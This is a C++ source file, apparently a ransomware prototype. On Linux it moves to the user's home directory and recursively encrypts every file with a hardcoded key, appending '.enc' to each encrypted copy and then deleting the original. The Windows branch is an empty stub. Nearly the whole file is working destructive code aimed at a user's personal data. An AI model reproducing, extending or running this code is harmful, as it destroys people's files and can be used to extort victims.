// Including the header files 
#include <iostream>
#include <string>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <errno.h>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include "headers/encryptFiles.h"
#include "headers/checkOperatingSystem.h"

// Creating a function to recursively encrypt files and folders 
void encryptFilesRecursively(const std::filesystem::path& path, const std::string& key) {
    if (std::filesystem::is_directory(path)) {
        // Iterate through the directory
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            encryptFilesRecursively(entry.path(), key); // Recursive call
        }
    } else if (std::filesystem::is_regular_file(path)) {
        // Check if the file is already encrypted
        if (path.extension() == ".enc") {
            std::cout << "Skipping already encrypted file: " << path.filename() << std::endl;
            return; // Skip already encrypted files
        }

        // Prepare output file name
        std::string outputFile = path.string() + ".enc"; // Append .enc to the original file name

        // Encrypt the file
        std::cout << "Encrypting file: " << path.filename() << std::endl;
        encrypt(path.string(), outputFile, key); // Pass the full path to the encrypt function

        // Check if the encryption was successful
        if (std::filesystem::exists(outputFile)) {
            // Remove the original file after successful encryption
            std::cout << "Removing original file: " << path.filename() << std::endl;
            std::filesystem::remove(path); // Remove the original file
        } else {
            std::cerr << "Encryption failed for file: " << path.filename() << std::endl;
        }
    }
}

// Running the main script 
int main() {
    // Creating the operating system variable 
    std::string operatingSystem; 

    // Getting the operating system 
    operatingSystem = checkOperatingSystem(); 

    // if the operating system is linux 
    if (operatingSystem == "linux") {
        // Setting the root directory 
        const char* homeDir = getenv("HOME"); 

        // Checking if the home directory exists in the env 
        if (homeDir == nullptr) {
            std::cerr << "Error retrieving the home directory." << std::endl; 
            return 1; // Exit with error
        } 

        // Go to the root directory
        if (chdir(homeDir) != 0) {
            std::cerr << "Error changing directory: " << strerror(errno) << std::endl; 
            return 1; // Exit with error
        }  

        // Print the working directory 
        char currentDir[1024]; 
        if (getcwd(currentDir, sizeof(currentDir)) != nullptr) {
            std::cout << "Current working directory: " << currentDir << std::endl;

            // Get the current path 
            std::filesystem::path currentPath = std::filesystem::current_path(); 

            // Setting the key 
            std::string key = "0123456789abcdef0123456789abcdef"; 
            encryptFilesRecursively(currentPath, key); 
        } else {
            std::cerr << "Error getting the current directory: " << strerror(errno) << std::endl; 
            return 1; // Exit with error
        }
    } 
    // else if the operating system is windows 
    else if (operatingSystem == "windows") {
        // Implement Windows-specific logic if needed
    } 
    // if the operating system is unknown, pass 
    else if (operatingSystem == "unknown") {
        // Handle unknown operating system case
    }

    // closing up 
    return 0; 
}
